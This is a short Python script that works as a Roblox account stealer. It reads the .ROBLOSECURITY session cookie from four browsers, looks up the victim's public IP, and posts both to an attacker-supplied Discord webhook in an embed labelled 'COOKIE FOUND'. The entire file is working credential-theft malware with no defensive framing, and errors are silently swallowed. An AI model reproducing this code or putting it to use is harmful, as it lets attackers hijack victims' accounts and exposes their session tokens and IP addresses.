import browser_cookie3
import requests
import concurrent.futures

WEBHOOK_URL = "" # Input your webhook here

def get_cookie(browser):
    try:
        if browser == "chrome":
            cookies = browser_cookie3.chrome(domain_name="roblox.com")
        elif browser == "firefox":
            cookies = browser_cookie3.firefox(domain_name="roblox.com")
        elif browser == "edge":
            cookies = browser_cookie3.edge(domain_name="roblox.com")
        elif browser == "opera":
            cookies = browser_cookie3.opera(domain_name="roblox.com")
        else:
            return None

        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WEBHOOK_URL, json={
            "username": "RED SKULL|COOK'ER",
            "avatar_url": "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png",
            "embeds": [{
                "title": f"COOKIE FOUND|Browser : {browser.capitalize()}",
                "description": f"```{cookie}```",
                "color": 16711680,
                "fields": [
                    {"name": "Victim's IP", "value": ip_address, "inline:": True}
                ],
                "footer": {
                    "text": "Krn0s@github",
                    "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
                }
            }]
        })
    except:
        pass

if __name__ == "__main__":
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(get_cookie, ["chrome", "firefox", "edge", "opera"])
